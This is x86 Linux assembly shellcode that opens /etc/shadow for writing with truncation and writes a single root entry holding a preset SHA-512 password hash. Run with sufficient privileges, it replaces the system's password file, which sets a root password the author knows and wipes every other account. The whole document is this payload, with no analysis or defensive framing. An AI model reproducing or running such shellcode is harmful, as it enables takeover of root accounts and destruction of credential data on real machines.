section .text
    global _start

_start:
    xor eax, eax         ; Clear eax
    xor ecx, ecx         ; Clear ecx
    xor edx, edx         ; Clear edx
    push eax             ; Push null byte onto stack
	push 0x776f6461		 ; adow
    push 0x68732f63		 ; c/sh
    push 0x74652f2f      ; //et

    mov ebx, esp         ; Move pointer to file name into ebx
    mov al, 5            ; sys_open
	mov cx, 577          ; O_WRONLY | O_CREAT
    mov dx, 440          ; permissions
    int 0x80

    mov ebx, eax         ; file descriptor

    xor eax, eax         ; Clear eax
    push eax             ; Push null byte onto stack
	
	push 0x20203a3a		 ; root:$6$TJd1amE7$Uh4ViEj1yE/t9m5PKVzPMfBACXbJLdpcVTjvmpfi6s7AG.wgVE2qvEtkKe7NSWNMNwoC0FBSKig1dKZDPMCcl0:19684:0:99999:7:::
    push 0x3a373a39
    push 0x39393939
    push 0x3a303a34
    push 0x38363931
    push 0x3a306c63
    push 0x434d5044
    push 0x5a4b6431
    push 0x67694b53
    push 0x42463043
    push 0x6f774e4d
    push 0x4e57534e
    push 0x37654b6b
    push 0x74457671
    push 0x32455667
    push 0x772e4741
    push 0x37733669
    push 0x66706d76
    push 0x6a545663
    push 0x70644c4a
    push 0x62584341
    push 0x42664d50
    push 0x7a564b50
    push 0x356d3974
    push 0x2f457931
    push 0x6a456956
    push 0x34685524
    push 0x37456d61
    push 0x31644a54
    push 0x2436243a
    push 0x746f6f72

    ; Write to file
    mov al, 4            ; sys_write
    xor edx, edx         ; Clear edx
    mov ecx, esp
    mov dl, 122          ; length of string
    int 0x80

    ; Close file
    mov al, 6            ; sys_close
    int 0x80

    ; Exit
    mov al, 1            ; sys_exit
    xor ebx, ebx
    int 0x80